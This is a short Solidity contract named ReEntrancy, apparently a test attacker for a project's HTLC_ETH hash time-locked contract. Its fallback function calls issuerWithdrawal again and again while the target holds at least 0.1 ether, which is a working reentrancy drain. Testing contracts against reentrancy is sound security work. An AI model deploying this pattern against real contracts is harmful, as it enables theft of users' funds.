pragma solidity 0.8.10;

import "../htlc/HTLC_ETH.sol";


contract ReEntrancy {

    HTLC_ETH htlcEth;

    bytes32 private id;
    bytes32 private secret;

    constructor(address _htlcEthAddress) {

        htlcEth = HTLC_ETH(_htlcEthAddress);
    }

    fallback() external payable {
        
        if (address(htlcEth).balance >= 0.1 ether) {

            htlcEth.issuerWithdrawal(id, secret);

        }
    }

    

    function attack(bytes32 _swapID, bytes32 _secretKey) external {

        id = _swapID;
        secret = _secretKey;
        
        htlcEth.issuerWithdrawal(_swapID, _secretKey);

    }
 
}